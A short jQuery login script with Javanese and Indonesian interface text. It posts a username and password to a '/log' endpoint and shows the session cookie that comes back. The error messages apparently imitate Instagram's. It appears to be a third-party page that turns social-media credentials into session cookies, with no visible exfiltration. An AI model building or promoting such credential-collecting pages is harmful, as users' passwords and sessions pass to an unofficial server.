$(()=>{
    $(document).on('click', 'button.elper', ()=> { 
        var penguna = $('input.user').val(), sandine = $('input.pass').val();
        $('label.error').text('');
        if(!penguna || penguna < 1){
            alert('USERNAME POK ISI.');
            return false;
        } else if(!sandine || sandine < 1){
            alert('SANDI POK ISI.');
            return false;
        }else {
            $.ajax({
                url: '/log',
                type: 'post',
                beforeSend: function(){
                    $('button.elper').text('Enteni Seg');
                },
                headers : {
                    'content-type' : 'application/x-www-form-urlencoded'
                },
                data: {
                    username : penguna,
                    password : sandine
                }
            }).done((data)=>{
                $('input.cookies').val(data.cookie);
                $('label.error').text('Sukses !!').css('color', 'green');
            }).fail((xhr)=>{
                let logfail = JSON.parse(xhr.responseText);
                $('input.cookies').attr('placeholder', 'Failed !!');
                $('button.elper').text('MASUK');
                if(logfail.status.indexOf('username') > - 1){
                    $('label.error').text('Nama pengguna yang Anda masukkan bukan milik akun tertentu. Periksa nama pengguna Anda lalu coba lagi.').css('color', 'red');
                }else if(logfail.status.indexOf('challenge_required') > - 1){
                    $('label.error').text('Account suspend get code.').css('color', 'red');
                } else {
                    $('label.error').text('Kata sandi yang Anda masukkan salah. Silahkan coba lagi.').css('color', 'red');
                }
            })
        }
    })
});